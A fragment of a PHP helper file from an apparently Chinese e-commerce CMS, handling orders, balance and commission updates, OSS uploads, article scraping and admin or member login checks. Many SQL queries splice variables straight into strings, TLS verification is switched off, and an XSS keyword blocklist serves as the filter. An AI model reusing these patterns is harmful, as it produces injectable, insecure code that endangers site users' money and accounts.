								mysqli_query($conn, "update sl_orders set O_time2='".date('Y-m-d H:i:s',strtotime('+'.$long.' year'))."',O_today='".date('Y-m-d H:i:s')."' where O_genkey='$genkey'");
							}
						}
						if(strpos($OX[$i],"天")!==false){
							$long=intval(splitx($OX[$i],"天",0));
							if($long>0){
								mysqli_query($conn, "update sl_orders set O_time2='".date('Y-m-d H:i:s',strtotime('+'.$long.' day'))."',O_today='".date('Y-m-d H:i:s')."' where O_genkey='$genkey'");
							}
						}
					}
				
					mysqli_query($conn, "update sl_product set P_sold=P_sold+$num where P_id=".$id);
					if($paytype=="余额支付"){
						mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
					}else{
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
					}
					if($P_mid!=$M_id){
						mysqli_query($conn, "update sl_member set M_fen=M_fen+".($money*$C_fen1)." where M_id=$M_id");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','购买商品','".date('Y-m-d H:i:s')."',".($money*$C_fen1).",'$genkey',1)");
					}
					
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','购买商品','".date('Y-m-d H:i:s')."',-".$money.",'$genkey','$no2')");
					//mysqli_query($conn, "insert into sl_orders(O_pid,O_mid,O_time,O_type,O_price,O_num,O_content,O_title,O_pic,O_address,O_state,O_genkey,O_sellmid) values($id,$M_id,'".date('Y-m-d H:i:s')."',0,$P_price,$num,'$O_content','$P_title','$P_pic','$O_address',$O_state,'$genkey',$P_mid)");
					//
					mysqli_query($conn, "update sl_orders set O_state=$O_state,O_content='$O_content' where O_genkey='$genkey'");

					if($fmid>0 && $P_mid==0){//只有主站商品加提成
						if($P_price2*$num-$money>0){
							$P_price2=$money/$num;
						}
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出商品','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','".date('Y-m-d H:i:s')."',-".($money*$P_price2/$P_price).",'$genkey')");
						mysqli_query($conn, "update sl_member set M_money=M_money+".($money-($money*$P_price2/$P_price))." where M_id=$fmid");
					}

					if($P_mid>0){
						$M=getrs("select * from sl_member where M_id=$P_mid");
						mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$P_mid");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($P_mid,'".date('YmdHis').rand(10000000,99999999)."','售出商品-".$P_title."','".date('Y-m-d H:i:s')."',$money,'')");
						sendmail("有用户通过".$paytype."购物","用户ID：".$M_id."<br>商品名称：".$P_title."<br>订单金额：".$money."元<br>交易单号：".$no,$M["M_email"]);
						$_SESSION["time2"]=0;
						if($C_dx5==1){
							sendsms("【".$C_smssign."】您的商品已售出，请登录会员中心查看，单号：".$no,$M["M_mobile"]);
						}
					}else{
						sendmail("有用户通过".$paytype."购物","用户ID：".$M_id."<br>商品名称：".$P_title."<br>订单金额：".$money."元<br>交易单号：".$no,$C_email);
						$_SESSION["time2"]=0;
						if($C_dx5==1){
							sendsms("【".$C_smssign."】有用户通过".$paytype."购物，请登录后台查看，交易单号：".$no,$C_mobile);
						}
					}

					if($P_fx==1){
						fx($money,$M_id,$P_mid);
					}
					
					if(checkauth()){
						plug("x4","../../conn/plug/");
						require "../../conn/plug/x4.php";
					}
					if(strpos(splitx($O_address,"__",0),"@")!==false && strpos(splitx($O_address,"__",0),".")!==false){
						sendmail("您的购买的商品已发货","<p>商品名称：".$P_title."</p><p>取货地址：".gethttp().$D_domain."/member/unlogin.php?type=fahuo&genkey=".$genkey."</p><p>订单编号：".$no."</p>",splitx($O_address,"__",0));
					}
				}
	        }
		    return true;
	    }else{
	    	return false;
	    }
	}
}


function fx($money,$M_id,$P_mid){
	global $C_fx1,$C_fx2,$C_fx3,$conn;
	$genkey=date('YmdHis').rand(1000,9999);

	if(checkauth()){
		plug("x2","../../conn/plug/");
		require "../../conn/plug/x2.php";
	}
}
function fx_vip($money,$M_id,$P_mid){
	global $C_fx1,$C_fx2,$C_fx3,$conn;
	$genkey=date('YmdHis').rand(1000,9999);

	if(checkauth()){
		plug("x2","../conn/plug/");
		require "../conn/plug/x2.php";
	}
}
function removexss($val) {
    $val = preg_replace ( '/([\x00-\x08\x0b-\x0c\x0e-\x19])/', '', $val );

    $search = 'abcdefghijklmnopqrstuvwxyz';
    $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $search .= '1234567890!@#$%^&*()';
    $search .= '~`";:?+/={}[]-_|\'\\';
    for($i = 0; $i < strlen ( $search ); $i ++) {

        $val = preg_replace ( '/(&#[xX]0{0,8}' . dechex ( ord ( $search [$i] ) ) . ';?)/i', $search [$i], $val );

        $val = preg_replace ( '/(&#0{0,8}' . ord ( $search [$i] ) . ';?)/', $search [$i], $val );
    }

    $ra1 = array (
        'javascript',
        'vbscript',
        'expression',
        'applet',
        'meta',
        'xml',
        'blink',
        'script',
        'object',
        'iframe',
        'frame',
        'frameset',
        'ilayer',
        'bgsound'
    );
    $ra2 = array (
        'onabort',
        'onactivate',
        'onafterprint',
        'onafterupdate',
        'onbeforeactivate',
        'onbeforecopy',
        'onbeforecut',
        'onbeforedeactivate',
        'onbeforeeditfocus',
        'onbeforepaste',
        'onbeforeprint',
        'onbeforeunload',
        'onbeforeupdate',
        'onbegin',
        'onblur',
        'onbounce',
        'oncellchange',
        'onchange',
        'onclick',
        'oncontextmenu',
        'oncontrolselect',
        'oncopy',
        'oncut',
        'ondataavailable',
        'ondatasetchanged',
        'ondatasetcomplete',
        'ondblclick',
        'ondeactivate',
        'ondrag',
        'ondragend',
        'ondragenter',
        'ondragleave',
        'ondragover',
        'ondragstart',
        'ondrop',
        'onerror',
        'onerrorupdate',
        'onfilterchange',
        'onfinish',
        'onfocus',
        'onfocusin',
        'onfocusout',
        'onhelp',
        'onkeydown',
        'onkeypress',
        'onkeyup',
        'onlayoutcomplete',
        'onload',
        'onlosecapture',
        'onmousedown',
        'onmouseenter',
        'onmouseleave',
        'onmousemove',
        'onmouseout',
        'onmouseover',
        'onmouseup',
        'onmousewheel',
        'onmove',
        'onmoveend',
        'onmovestart',
        'onpaste',
        'onpropertychange',
        'onreadystatechange',
        'onreset',
        'onresize',
        'onresizeend',
        'onresizestart',
        'onrowenter',
        'onrowexit',
        'onrowsdelete',
        'onrowsinserted',
        'onscroll',
        'onselect',
        'onselectionchange',
        'onselectstart',
        'onstart',
        'onstop',
        'onsubmit',
        'ontoggle',
        'onunload'
    );
    $ra = array_merge ( $ra1, $ra2 );

    $found = true;
    while ( $found == true ) {
        $val_before = $val;
        for($i = 0; $i < sizeof ( $ra ); $i ++) {
            $pattern = '/';
            for($j = 0; $j < strlen ( $ra [$i] ); $j ++) {
                if ($j > 0) {
                    $pattern .= '(';
                    $pattern .= '(&#[xX]0{0,8}([9ab]);)';
                    $pattern .= '|';
                    $pattern .= '|(&#0{0,8}([9|10|13]);)';
                    $pattern .= ')*';
                }
                $pattern .= $ra [$i] [$j];
            }
            $pattern .= '/i';
            $replacement = substr ( $ra [$i], 0, 2 ) . ' ' . substr ( $ra [$i], 2 );
            $val = preg_replace ( $pattern, $replacement, $val );
            if ($val_before == $val) {

                $found = false;
            }
        }
    }
    return $val;
}

function gethttp(){
    if (is_ssl()){
        $gethttp="https://";
    }else{
        $gethttp="http://";
    }
    return $gethttp;
}


function is_ssl() {
    global $config;
    if($config->https=="true"){
        return true;
    }else{
        if(isset($_SERVER['HTTPS']) && ('1' == $_SERVER['HTTPS'] || 'on' == strtolower($_SERVER['HTTPS']))){
            return true;
        }else{
            if(isset($_SERVER['SERVER_PORT']) && ('443' == $_SERVER['SERVER_PORT'] )) {
                return true;
            }else{
                if(isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && ('https' == $_SERVER['HTTP_X_FORWARDED_PROTO'] )) {
                    return true;
                }else{
                    if(isset($_SERVER['HTTP_FROM_HTTPS']) && ('on' == $_SERVER['HTTP_FROM_HTTPS'] )) {
                        return true;
                    }else{
                        return false;
                    }
                }
            }
        }
    }
}

function html($str){
	if(checkauth()){
		plug("x9","conn/plug/");
		require "conn/plug/x9.php";
		$str=str_replace("index-1.html","./",$str);
		$str=str_replace("index-0.html","./",$str);
	}else{
		die("{\"msg\":\"免费版暂不支持伪静态\"}");
	}
	return $str;
}

function admin_auth(){
	global $conn;
	if($_SESSION["A_login"]=="" || $_SESSION["A_pwd"]==""){
		return false;
	}else{
		$sql="select * from sl_admin where A_login='".$_SESSION["A_login"]."' and A_pwd='".$_SESSION["A_pwd"]."' and A_del=0";
		$result = mysqli_query($conn, $sql);
		$row = mysqli_fetch_assoc($result);
		if(mysqli_num_rows($result) > 0) {
			return true;
		}else{
			return false;
		}
	}
}

function member_auth($M_id,$M_pwd){
	global $conn;
	$sql="select * from sl_member where M_id=".$M_id." and M_pwd='".$M_pwd."' and not M_login='未登录帐号' and M_del=0";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if(mysqli_num_rows($result) > 0) {
		return true;
	}else{
		return false;
	}
}

function app_back($url,$msg){
	if($msg==""){
		$msg_info="";
	}else{
		$msg_info="alert(\"".$msg."\");";
	}
	if($url=="back"){
		$url_info="uni.navigateBack({delta: 1});";
	}else{
		$url_info="uni.reLaunch({url: \"".$url."\"});";
	}
	return "<script type=\"text/javascript\" src=\"https://js.cdn.aliyun.dcloud.net.cn/dev/uni-app/uni.webview.1.5.2.js\"></script><script>".$msg_info."document.addEventListener(\"UniAppJSBridgeReady\", function(){".$url_info."});</script>";
}

function fdate($date){
//如果是同一天，则显示时+分
//如果是昨天，则显示昨天+时+分
//如果是昨天以前，则显示月+日
//如果是去年，则显示年+月+日

    $timestamp=strtotime($date);

    $y1=date('y',time());
    $y2=date('y',strtotime($date));
    $m1=date('m',time());
    $m2=date('m',strtotime($date));
    $d1=date('d',time());
    $d2=date('d',strtotime($date));

    if(date('Ymd', $timestamp) == date('Ymd')){
        return date('H:i', $timestamp);
    }else{
        if(date('Ym', $timestamp) == date('Ym') && date('d')-date('d', $timestamp)==1){
            return "昨天".date('H:i', $timestamp);
        }else{
            if(date('Y', $timestamp) == date('Y')){
                return date('m-d', $timestamp);
            }else{
                return date('Y-m-d', $timestamp);
            }
        }
    }
}

function savepic($str,$dirx){
	$str=str_replace("\\\"","\"",$str);
	$str=str_replace("'","\"",$str);
	$s=explode("src=\"",$str);
	for($i=1;$i<count($s);$i++){
		$pic=splitx($s[$i],"\"",0);
		$pic=str_Replace($dirx."media/img.php?url=","",$pic);
		if(substr($pic,0,7)=="http://" || substr($pic,0,8)=="https://" || substr($pic,0,2)=="//"){
			$ymd=date("Ymd");
			if(!is_dir("../kindeditor/attached/image/".$ymd)){
				 @mkdir("../kindeditor/attached/image/".$ymd,0777,true);
			}
			$str=str_replace($pic,$dirx."kindeditor/attached/image/".$ymd."/".downpic("../kindeditor/attached/image/".$ymd."/",$pic),$str);
			$str=str_replace($dirx."media/img.php?url=","",$str);
		}
	}
	return $str;
}


function editor2oss($str){
	$str=str_replace("\\\"","\"",$str);
	$str=str_replace("'","\"",$str);
	$s=explode("src=\"",$str);
	for($i=1;$i<count($s);$i++){
		$pic=splitx($s[$i],"\"",0);
		$pic=str_replace("php/../","",$pic);
		if(substr($pic,0,11)=="/kindeditor"){
			tooss("..".$pic);
		}
	}
	return $str;
}

function tooss($path){
    global $C_osson,$C_oss_id,$C_oss_key,$C_bucket,$C_region,$conn;
    //if($C_osson==1){
        $O_md5=getrs("select * from sl_oss where O_name='".$path."'","O_md5");
        if($O_md5!=md5(file_get_contents($path))){
            if($O_md5==""){
                mysqli_query($conn,"insert into sl_oss(O_name,O_md5) values('".$path."','".md5(file_get_contents($path))."')");
            }else{
                mysqli_query($conn,"update sl_oss set O_md5=".md5(file_get_contents($path))." where O_name='".$path."'");
            }

            $kname = strtolower(substr($path,strrpos($path,'.')+1));
            switch($kname){
                case "bmp":
                $mime="image/bmp";
                break;

                case "png":
                $mime="image/png";
                break;

                case "jpg":
                $mime="image/jpg";
                break;

                case "js":
                $mime="application/x-javascript";
                break;

                case "css":
                $mime="text/css";
                break;

                case "jpeg":
                $mime="image/jpeg";
                break;

                case "gif":
                $mime="image/gif";
                break;

                case "mp4":
                $mime="video/mp4";
                break;

                case "mp3":
                $mime="audio/mpeg";
                break;

                case "wma":
                $mime="audio/x-ms-wma";
                break;

                case "wav":
                $mime="audio/x-wav";
                break;

                default:
                $mime="image/jpg";
                break;
            }
            $url = "http://" . $C_bucket . "." . $C_region;
            $policy = "{\"expiration\": \"2120-01-01T12:00:00.000Z\",\"conditions\":[{\"bucket\": \"" . $C_bucket . "\" },[\"content-length-range\", 0, 104857600]]}";
            $policy = base64_encode($policy);
            $signature = base64_encode(hash_hmac("sha1", $policy, $C_oss_key, true));

	        if(class_exists('\CURLFile')) {
	            $data = array (
	                'OSSAccessKeyId' => $C_oss_id,
	                'Content-Type'=>$mime,
	                'policy' => $policy,
	                'signature' => $signature,
	                'key' => str_replace("../","",$path),
	                'file'=> new \CURLFile($path,$mime,str_replace("../","",$path)),
	                'type'=> $mime,
	                'submit' => 'Upload to OSS'
	            );
	        }else{
		        $data = array (
	                'OSSAccessKeyId' => $C_oss_id,
	                'Content-Type'=>$mime,
	                'policy' => $policy,
	                'signature' => $signature,
	                'key' => str_replace("../","",$path),
	                'file'=>'@'.$path.";type=".$mime,
	                'submit' => 'Upload to OSS'
	            );
	        }

            $ch = curl_init ();

            curl_setopt ( $ch, CURLOPT_URL, $url );
            curl_setopt ( $ch, CURLOPT_POST, 1 );
            curl_setopt ( $ch, CURLOPT_HEADER, 0 );
            curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );
            curl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );
            $return = curl_exec ( $ch );
            if($return === false){
             var_dump(curl_error($ch));
            }

            $info = curl_getinfo($ch);
            curl_close ($ch);

            if($info["size_download"]==0){
                return true;
            }else{
                return false;
            }
        }else{
            return true;
        }
    //}else{
    //    return false;
    //}
}

function pic($path){
	global $C_osson,$C_bucket,$C_region,$C_oss_domain;
	if(substr($path,0,7)=="http://" || substr($path,0,8)=="https://" || substr($path,0,2)=="//"){
		$P_pic=$path;
	}else{
		if($C_osson==1){
			if($C_oss_domain==""){
				$P_pic="https://".$C_bucket.".".$C_region."/media/".$path;
			}else{
				$P_pic=$C_oss_domain."/media/".$path;
			}
		}else{
			$P_pic="media/".$path;
		}
	}
	return $P_pic;
}

function get_article($url){
	global $dirx;
	if(strpos($url,"mp.weixin.qq.com")!==false){//微信公众号
		$info=GetBody2($url,"","GET");
		$title=splitx($info,"<meta property=\"og:title\" content=\"",1);
		$title=splitx($title,"\"",0);

		$img=splitx($info,"<meta property=\"og:image\" content=\"",1);
		$img=splitx($img,"\"",0);

		$keyword="";

		$description=splitx($info,"<meta name=\"description\" content=\"",1);
		$description=splitx($description,"\"",0);

		$content=splitx($info,"<div class=\"rich_media_content \" id=\"js_content\" style=\"visibility: hidden;\">",1);
		$content=splitx($content,"</div>",0);
		$content=str_replace("data-src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}
	/*
	if(strpos($url,"toutiao.com")!==false){//头条号
		$info=GetBody2($url,"","GET");
		$title=splitx($info,"<title>",1);
		$title=splitx($title,"</title>",0);

		$keyword=splitx($info,"<meta name=keywords content=",1);
		$keyword=splitx($keyword,">",0);

		$description=splitx($info,"<meta name=description content=",1);
		$description=splitx($description,">",0);

		$img=splitx($info,"coverImg: '",1);
		$img=splitx($img,"'",0);

		$content=splitx($info,"content: '",1);
		$content=splitx($content,"'",0);
		$content=html_entity_decode(json_decode(htmlspecialchars_decode($content)));

		$content=str_replace("src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}
	*/
	if(strpos($url,"baijiahao.baidu.com")!==false){//百家号

		$info=GetBody2($url,"","GET");

		$title=splitx($info,"<title>",1);
		$title=splitx($title,"</title>",0);

		$keyword=splitx($info,"<meta name=\"description\" content=\"",1);
		$keyword=splitx($keyword,"\"",0);

		$description=splitx($info,"<meta name=\"description\" content=\"",1);
		$description=splitx($description,"\"",0);

		$content=splitx($info,"<div class=\"article-content\">",1);
		$content=splitx($content,"</div><audio",0);

		$img=splitx($content," src=\"",1);
		$img=splitx($img,"\"",0);

		$content=str_replace("src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}
	if(strpos($url,"sina.com.cn")!==false){//新浪新闻
		$info=GetBody2($url,"","GET");
		$title=splitx($info,"<meta property=\"og:title\" content=\"",1);
		$title=splitx($title,"\"",0);

		$keyword=splitx($info,"<meta name=\"description\" content=\"",1);
		$keyword=splitx($keyword,"\"",0);

		$description=splitx($info,"<meta name=\"description\" content=\"",1);
		$description=splitx($description,"\"",0);

		$img=splitx($info,"<meta property=\"og:image\" content=\"",1);
		$img=splitx($img,"\"",0);

		$content=splitx($info,"<!-- 引文 end -->
			<!-- 正文 start -->",1);
		$content=splitx($content,"<!-- 正文 end -->",0);
		$content=str_replace("data-src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}

	$arr=array();
	$arr["title"]=$title;
	$arr["img"]=$img;
	$arr["keyword"]=$keyword;
	$arr["description"]=$description;
	$arr["content"]=$content;
	return $arr;
}

function GetBody2($url, $xml,$method='POST'){        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)" ); 
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, TRUE);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

        if(ini_get("safe_mode")==false && ini_get("open_basedir")==false){
            curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
        }
        if(extension_loaded('zlib')){
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
        }

        $data = curl_exec($ch);
        if($data){
            curl_close($ch);
            return $data;
        } else { 
            $error = curl_errno($ch);
            curl_close($ch);
            return false;
        }
}

function pic2($path){
	global $C_osson,$C_bucket,$C_region,$C_oss_domain;
	if(substr($path,0,7)=="http://" || substr($path,0,8)=="https://" || substr($path,0,2)=="//"){
		$P_pic=$path;
	}else{
		if($C_osson==1){
			if($C_oss_domain==""){
				$P_pic="https://".$C_bucket.".".$C_region."/media/".$path;
			}else{
				$P_pic=$C_oss_domain."/media/".$path;
			}
		}else{
			$P_pic="../media/".$path;
		}
	}
	return $P_pic;
}

function editor_oss($str){
	global $C_osson,$C_bucket,$C_region,$C_oss_domain;
	$C_installdir=splitx($_SERVER["PHP_SELF"],"index.php",0);
	if($C_osson==1){
		if($C_oss_domain==""){
			$str=str_replace($C_installdir."kindeditor/","https://".$C_bucket.".".$C_region."/kindeditor/",$str);
		}else{
			$str=str_replace($C_installdir."kindeditor/",$C_oss_domain."/kindeditor/",$str);
		}
	}
	return $str;
}

function shuxing($type){
	foreach ($_GET as $x=>$value) {
	  if($_GET[$x]!="" && substr($x,0,1)=="f"){
	    $info=$info." and ".$type." like '%".t($_GET[$x])."%'";
	  }
	} 
	return $info;
}

function d($t){
	global $C_template,$C_wap;

	if(isMobile()){
		$tx=$C_wap;
	}else{
		$tx=$C_template;
	}
	if (!is_file("template/".$tx."/config.xml")){
		return $t;
	}else{
		$xmlpath="template/".$tx."/config.xml";
		$content = trim(file_get_contents($xmlpath),"\xEF\xBB\xBF");
		$xml = simplexml_load_string($content);
		foreach ($xml as $value) {
		$i=0;
		foreach ($value[$i]->tag as $value2) {
		    switch($value2[0]->type){
		        case "text":
		        $t=str_Replace("<fh-tag>".$value2[0]->title."</fh-tag>",$value2[0]->content,$t);
		        break;
		        case "img":
		        $t=str_Replace("<fh-tag>".$value2[0]->title."</fh-tag>","template/".$tx."/images/".$value2[0]->content,$t);
		        break;
		    }
		    $t=str_Replace("<fh-tag>".$value2[0]->title."url</fh-tag>",$value2[0]->url,$t);
		    $t=str_Replace("<fh-tag>".$value2[0]->title."en</fh-tag>",$value2[0]->en,$t);
		    $i+=1;
		}
		}

		$ReplaceTag=$t;
		return $ReplaceTag;
	}
}

function www($str){
	if(substr($str,0,4)=="www."){
		return substr($str,4);
	}else{
		return $str;
	}
}
function cart($ids,$total_fee,$no,$paytype){
	global $conn,$C_n_discount,$C_p_discount,$C_n_discount2,$C_p_discount2,$C_email,$C_fx1,$C_fx2,$C_fx3,$C_fen1,$C_mobile,$C_smssign,$C_dx5,$fmid;
	$sqlx = "select * from sl_list where L_no='" . $no . "'";//用户充值
    $resultx = mysqli_query($conn, $sqlx);
    $rowx = mysqli_fetch_assoc($resultx);
    if (mysqli_num_rows($resultx) <= 0) {
		$ids=explode(",",$ids);
		for ($i=0 ;$i<count($ids);$i++) {
			$sql="select * from sl_orders where O_del=0 and O_id=".intval($ids[$i]);
			$result = mysqli_query($conn, $sql);
			$row = mysqli_fetch_assoc($result);
			if (mysqli_num_rows($result) > 0) {
				$fee=$fee+round($row["O_price"]*$row["O_num"],2);
			}
		}
		if($fee==$total_fee){
			for ($i=0 ;$i<count($ids);$i++) {
				$orders=getrs("select * from sl_orders where O_del=0 and O_id=".intval($ids[$i]));
				$id=$orders["O_pid"];
				$num=$orders["O_num"];
				$genkey=$orders["O_genkey"];
				$M_id=$orders["O_mid"];
				$money=round($orders["O_price"]*$orders["O_num"],2);

				$sql2="select * from sl_product where P_del=0 and P_id=".$id;
				$result2 = mysqli_query($conn, $sql2);
				$row2 = mysqli_fetch_assoc($result2);
				if (mysqli_num_rows($result2) > 0) {
					$P_title=$row2["P_title"];
					$P_pic=$row2["P_pic"];
					$P_sell=$row2["P_sell"];
					$P_selltype=$row2["P_selltype"];
					if($row2["P_vip"]==1){
						$P_price=p($row2["P_price"])*$P_discount;
						$P_price2=round($row2["P_price2"],2);
					}else{
						$P_price=p($row2["P_price"]);
						$P_price2=round($row2["P_price2"],2);
					}
					
					$P_mid=$row2["P_mid"];
					$P_fx=$row2["P_fx"];
				}
				//if(round($P_price*$num,2)==round($money,2)){
					switch($P_selltype){
					  	case 0:
					  		$O_content=$P_sell;
					  		$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
					  		$O_state=1;
					  	break;
					  	case 1:
					  		for($j=0;$j<$num;$j++){
								$C_id=getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=".intval($P_sell),"C_id");
								$C_content=getrs("select * from sl_card where C_id=".intval($C_id),"C_content");
								if($C_content==""){
									$O_content=$O_content."商品缺货，请联系客服||";
								}else{
									$O_content=$O_content.$C_content."||";
								}
								mysqli_query($conn,"update sl_card set C_use=1 where C_id=".intval($C_id));
							}
							$O_content=substr($O_content,0,strlen($O_content)-2);
							$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
							$O_state=1;
					  	break;
					  	case 2:
					  		mysqli_query($conn,"update sl_product set P_rest=P_rest-$num where P_id=".$id);
					  		$O_content="实物商品，由商家手动发货";
					  		$O_address=getrs("select O_address from sl_orders where O_genkey='$genkey'","O_address");
					  		$O_state=2;
					  	break;
					}
				
					mysqli_query($conn, "update sl_product set P_sold=P_sold+$num where P_id=".$id);
					if($paytype=="余额支付"){
						mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
					}else{
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
					}
					if($P_mid!=$M_id){
						mysqli_query($conn, "update sl_member set M_fen=M_fen+".($money*$C_fen1)." where M_id=$M_id");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','购买商品','".date('Y-m-d H:i:s')."',".($money*$C_fen1).",'$genkey',1)");
					}
					
					mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','购买商品','".date('Y-m-d H:i:s')."',-".$money.",'$genkey')");
					mysqli_query($conn, "update sl_orders set O_state=$O_state,O_content='$O_content' where O_genkey='$genkey'");

					if($fmid>0 && $P_mid==0){//只有主站商品加提成
						if($P_price2*$num-$money>0){
							$P_price2=$money/$num;
						}
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出商品','".date('Y-m-d H:i:s')."',".$money.",'$genkey')");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','".date('Y-m-d H:i:s')."',-".($P_price2*$num).",'$genkey')");
						mysqli_query($conn, "update sl_member set M_money=M_money+".($money-($P_price2*$num))." where M_id=$fmid");
					}

					if($P_mid>0){
						mysqli_query($conn, "update sl_member set M_money=M_money+".$money." where M_id=$P_mid");
						mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($P_mid,'".date('YmdHis').rand(10000000,99999999)."','售出商品-".$P_title."','".date('Y-m-d H:i:s')."',$money,'')");
					}

					if($P_fx==1){
						fx($money,$M_id,$P_mid);
					}
					
					if(checkauth()){
						plug("x4","../../conn/plug/");
						require "../../conn/plug/x4.php";
					}
					sendmail("您的购买的商品已发货","<p>商品名称：".$P_title."</p><p>发货内容：".$O_content."</p><p>订单编号：".$genkey."</p>",splitx($O_address,"__",0));
				//}
			}
			return true;
		}else{
			return false;
		}
	}else{
		return false;
	}
}


function geturls($D_domain){
    global $conn,$C_html;
    $D_domain=gethttp().$D_domain;
    $urls=$D_domain."|";

    $sql="select id,type from(select N_id as id,'newsinfo' as type from sl_news where N_del=0 and N_sh=1 
union select S_id as id,'news' as type from sl_nsort where S_del=0 
union select C_id as id,'courseinfo' as type from sl_course where C_del=0
union select S_id as id,'course' as type from sl_usort where S_del=0 
union select P_id as id,'productinfo' as type from sl_product where P_del=0 and P_sh=1
union select S_id as id,'product' as type from sl_psort where S_del=0 
union select T_id as id,'text' as type from sl_text where T_del=0)a limit 1999";

    $result = mysqli_query($conn, $sql);
    if(mysqli_num_rows($result) > 0) {
        while($row = mysqli_fetch_assoc($result)) {
        	if($C_html==1){
        		$urls=$urls.$D_domain."/".$row["type"]."-".$row["id"].".html|";
        	}else{
        		$urls=$urls.$D_domain."/?type=".$row["type"]."&id=".$row["id"]."|";
        	}
        }
    }

    $urls= substr($urls,0,strlen($urls)-1);
    return explode("|",$urls);
}

function match_chinese($chars,$encoding='utf8'){
    $pattern =($encoding=='utf8')?'/[\x{4e00}-\x{9fa5}a-zA-Z0-9]/u':'/[\x80-\xFF]/';
    preg_match_all($pattern,$chars,$result);
    $temp =join('',$result[0]);
    return $temp;
}
function mkdirs_2($path){
    if(!is_dir($path)){
        mkdirs_2(dirname($path));
        if(!mkdir($path, 0777)){
            return false;
        }
    }
    return true;
}


function is_mobile($mobile){
    if(empty($mobile)) return false;
    $eg = '/^((13[0-9])|(14[5,7])|(15[0-3,5-9])|(17[0,3,5-8])|(18[0-9])|166|198|199)\d{8}$/';
    if(preg_match($eg, $mobile)){
        return true;
    }else{
        return false;
    }
}

function downloadFile($filePath, $readBuffer = 1024, $allowExt = ['jpeg', 'jpg', 'peg', 'gif', 'zip', 'rar', 'txt']){
    //检测下载文件是否存在 并且可读
    if (!is_file($filePath) && !is_readable($filePath)) {
        return false;
    }
    //检测文件类型是否允许下载
    $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    if (!in_array($ext, $allowExt)) {
        return false;
    }
    //设置头信息
    //声明浏览器输出的是字节流
    header('Content-Type: application/octet-stream');
    //声明浏览器返回大小是按字节进行计算
    header('Accept-Ranges:bytes');
    //告诉浏览器文件的总大小
    $fileSize = filesize($filePath);//坑 filesize 如果超过2G 低版本php会返回负数
    header('Content-Length:' . $fileSize); //注意是'Content-Length:' 非Accept-Length
    //声明下载文件的名称
    header('Content-Disposition:attachment;filename=' . basename($filePath));//声明作为附件处理和下载后文件的名称
    //获取文件内容
    $handle = fopen($filePath, 'rb');//二进制文件用‘rb’模式读取
    while (!feof($handle) ) { //循环到文件末尾 规定每次读取（向浏览器输出为$readBuffer设置的字节数）
        echo fread($handle, $readBuffer);
    }
    fclose($handle);//关闭文件句柄
    exit;

}

function changeTimeType($seconds){
    if ($seconds > 3600){
        $hours = intval($seconds/3600);
        $minutes = $seconds % 3600;
        $time = $hours.":".gmstrftime('%M:%S', $minutes);
    }else{
        $time = gmstrftime('%H:%M:%S', $seconds);
    }
    return $time;
}


function calculation($name){
	$a=rand(1,9);
	$b=rand(1,9);
	$s=rand(1,2);

	switch($s){
		case 1:
		$symbol="＋";
		$c=$a+$b;
		break;
		case 2:
		$symbol="×";
		$c=$a*$b;
		break;
	}

	$_SESSION["CmsCode"]=$c;
	return "<div style=\"background: #f7f7f7;text-align: center;padding: 8px;\">计算结果：".$a." ".$symbol." ".$b." = <input type=\"text\" style=\"width: 50px;height: 25px;\" name=\"".$name."\"></div>";
